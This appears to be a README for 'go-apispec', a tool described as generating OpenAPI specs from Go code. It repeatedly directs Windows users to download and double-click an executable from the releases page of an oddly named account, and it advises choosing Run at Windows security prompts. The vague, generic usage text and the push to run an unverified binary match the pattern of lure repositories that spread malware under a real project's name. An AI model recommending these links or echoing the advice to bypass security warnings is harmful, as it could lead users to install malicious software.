# 🧭 go-apispec - Build OpenAPI specs from Go code

[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases)

## 📦 What this app does

go-apispec helps you create an OpenAPI 3.1 spec from Go source code.

It reads your Go project, checks your routes, and builds an API spec file from what it finds. You do not need to add extra tags or annotations. It can work with common Go web frameworks such as chi, echo, fiber, gin, and gorilla-mux.

Use it when you want a clean API spec without hand-writing each endpoint.

## 💻 Before you start

You need:

- A Windows PC
- Internet access
- Permission to download files
- A Go app you want to inspect, if you plan to scan your own code

For most users, no setup is needed beyond downloading the release file.

## 🚀 Download and run on Windows

1. Visit the release page: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases
2. Look for the latest release at the top of the page
3. In the Assets section, download the Windows file for your system
4. Save the file to a folder you can find later, such as Downloads or Desktop
5. Open the folder where you saved the file
6. If the download is a ZIP file, right-click it and choose Extract All
7. Open the extracted folder
8. Double-click the program file to run it

If Windows shows a security prompt, choose Run if you trust the file from the release page.

## 🪟 What to download

Look for one of these file types on the release page:

- `.exe` for direct use on Windows
- `.zip` if the app comes packed with extra files
- `.msi` if the app uses a Windows installer

If you see more than one file, choose the one made for Windows and your computer type.

## 🛠️ First run

After you open the app, you may see a command window or a simple interface.

If the app asks for a project path:

1. Open the folder that contains your Go project
2. Copy the full folder path
3. Paste it into the app
4. Start the scan or generation step

If the app writes output to a folder, check for files such as:

- `openapi.yaml`
- `openapi.json`
- `swagger.yaml`
- `swagger.json`

## 📁 How to use it with a Go project

go-apispec scans Go source code and looks for route patterns used by common web frameworks.

A typical flow looks like this:

1. Open your Go project folder
2. Run go-apispec against that folder
3. Let it inspect your routes and handlers
4. Save the generated OpenAPI file
5. Use that file in tools that read OpenAPI 3.1 specs

This helps you keep API docs in step with the code you already have.

## 🔎 Framework support

go-apispec is built for projects that use common Go router styles, including:

- chi
- echo
- fiber
- gin
- gorilla-mux

It uses static analysis, which means it reads the code instead of waiting for the app to run.

## 🧩 What you can expect

The generated spec can include:

- API paths
- HTTP methods
- Route parameters
- Request and response structure
- Basic operation details
- OpenAPI 3.1 format

This gives you a starting point for docs, testing tools, and client generation.

## 🗂️ Example use case

If you already have a Go API and want a spec for it:

1. Point go-apispec at your source folder
2. Let it scan your route files
3. Review the output file
4. Import the file into an API viewer or editor
5. Share the spec with your team

This is useful when you want docs without changing your codebase first.

## 🔧 Tips for Windows users

- Keep the app and your Go project in folders with simple names
- Avoid paths with special characters if you can
- Place the output file in a folder you can reach easily
- If you use a ZIP release, extract it before you run the app
- If Windows blocks the file, open file properties and check whether it came from the downloaded release

## 📌 Common file locations

You may want to keep files in these folders:

- `Downloads` for the release file
- `Desktop` for quick access
- A project folder like `C:\Projects\my-api`
- An output folder like `C:\Users\YourName\Documents\openapi`

## 🧠 Simple workflow

1. Download the release from the GitHub releases page
2. Open or extract the file on Windows
3. Run the app
4. Point it at your Go project
5. Generate the OpenAPI spec
6. Open the result in your preferred tool

## 📚 Helpful terms

- **OpenAPI**: A standard way to describe an API
- **Spec**: A file that describes API routes and data
- **Static analysis**: Reading source code without running it
- **Route**: A path like `/users` or `/orders/{id}`
- **Handler**: The code that runs when a route is called

## 🔗 Download again

Visit the release page to download: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases

## 🧪 Working with the output

After the spec is created, you can:

- Open it in an API editor
- Use it for documentation
- Feed it into code generation tools
- Check routes for missing details
- Share it with other people who need the API shape

## 🧭 Folder example

A simple setup may look like this:

- `C:\Users\YourName\Downloads\go-apispec.zip`
- `C:\Users\YourName\Desktop\go-apispec\`
- `C:\Projects\my-api\`
- `C:\Users\YourName\Documents\api-specs\openapi.yaml`

## 🧰 If your project uses one of these patterns

go-apispec is a good fit if your code uses:

- Router groups
- Route middleware
- Path parameters
- Versioned API routes
- JSON request and response handlers

It reads the structure in your source and turns it into a spec file

## 📍 Release page

Primary download link: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases